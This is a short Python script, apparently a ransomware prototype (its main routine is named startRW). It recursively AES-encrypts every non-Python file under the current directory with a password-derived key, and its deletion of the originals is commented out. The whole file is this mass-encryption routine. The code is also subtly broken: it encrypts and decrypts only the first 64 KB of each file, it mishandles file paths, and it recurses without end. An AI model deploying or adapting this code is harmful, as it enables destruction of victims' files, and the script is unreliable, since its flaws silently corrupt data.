import os
import sys
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Util import Padding

def encrypt(key, filename):
    chunksize = 64 * 1024
    outFile = os.path.join(os.path.dirname(filename), "(encrypted)" + os.path.basename(filename))
    IV = os.urandom(16)
    encryptor = AES.new(key, AES.MODE_CBC, IV)
    with open(filename, "rb") as infile:
        with open(outFile, "wb") as outfile:
            outfile.write(IV)
            chunk = (infile.read(chunksize))
            block = Padding.pad(bytes(chunk), 16, "pkcs7")
            outfile.write(encryptor.encrypt(bytes(block)))


def decrypt(key, filename):
    outFile = os.path.join(os.path.dirname(filename), os.path.basename(filename[11:]))
    chunksize = 64 * 1024
    with open(filename, "rb") as infile:
        IV = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, IV)
        with open(outFile, "wb") as outfile:
            chunk = infile.read(chunksize)
            decryptedchunk = decryptor.decrypt(chunk)
            block = Padding.unpad(bytes(decryptedchunk), 16, "pkcs7")
            outfile.write(block)


def allfiles():
    allFiles = []
    for root, subfiles, files in os.walk(os.getcwd()):
        for names in files:
            allFiles.append(os.path.join(root, names))
    return allFiles


def startRW():
    choice = input("Please choose to either (E)ncrypt or (D)ecrypt files ")
    password = input("Enter the password: ")
    encfiles = allfiles()

    if choice == "E":
        for files in encfiles:
            if os.path.basename(files).startswith("(encrypted)"):
                print("%s is already encrypted" % str(files))
                pass
            elif files == os.path.join(os.getcwd(), sys.argv[0]) or os.path.basename(files).endswith("py"):
                print("%s have been skipped" % str(files))
                pass
            else:
                encrypt(SHA256.new(password.encode("utf8")).digest(), str(files))
                print("%s has been successfully encrypted" % str(files))
                #os.remove(files)

        startRW()

    elif choice == "D":
        filename = input("Please enter the file to be decrypted: ")
        if not os.path.exists(filename):
            print("the file does not exists")
            startRW()
        elif not filename.startswith("(encrypted)"):
            print("file: %s have not been encrypted" % str(filename))
            startRW()
        else:
            decrypt(SHA256.new(password.encode("utf8")).digest(), filename)
            print("%s have been successfully decrypted" % str(filename))
            os.remove(filename)
            startRW()
    else:
        print("invalid command entered")
        startRW()


startRW()
